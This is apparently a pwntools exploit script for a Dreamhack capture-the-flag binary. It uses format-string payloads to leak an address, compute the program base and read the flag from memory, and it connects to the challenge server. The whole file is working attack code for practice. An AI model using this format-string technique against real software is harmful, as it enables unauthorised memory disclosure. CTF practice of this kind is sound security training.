#!/usr/bin/env python3
from pwn import *

exe = ELF('chall', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
context.binary = exe

s= lambda data : p.send(data)
sa  = lambda msg, data: p.sendafter(msg, data)
sl  = lambda data: p.sendline(data)
sla = lambda msg, data: p.sendlineafter(msg, data)
sn  = lambda num: p.send(str(num).encode())
sna = lambda msg, num: p.sendafter(msg, str(num).encode())
sln = lambda num: p.sendline(str(num).encode())
slna = lambda msg, num: p.sendlineafter(msg, str(num).encode())

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            b *main +84
            
        ''')
        

if args.REMOTE:
    p = remote('host3.dreamhack.games',15263)
else:
    p = process(exe.path)


GDB()

sla(b'> ',b'2')
payload = b'%14$p'
s(payload)
leak= int(p.recvuntil(b'>',drop=True),16)
log.info(b'leak_address: '+ hex(leak).encode())
exe.address= leak - 0x3d80
log.info(b'exe_address: '+ hex(exe.address).encode())
input()
sla(b' ',b'1')
sla(b'> ',b'2')
flag_address= exe.address+0x4060
payload = b'%10$s'
payload = payload.ljust(0x20)
payload += p64(flag_address)
s(payload)

p.interactive()
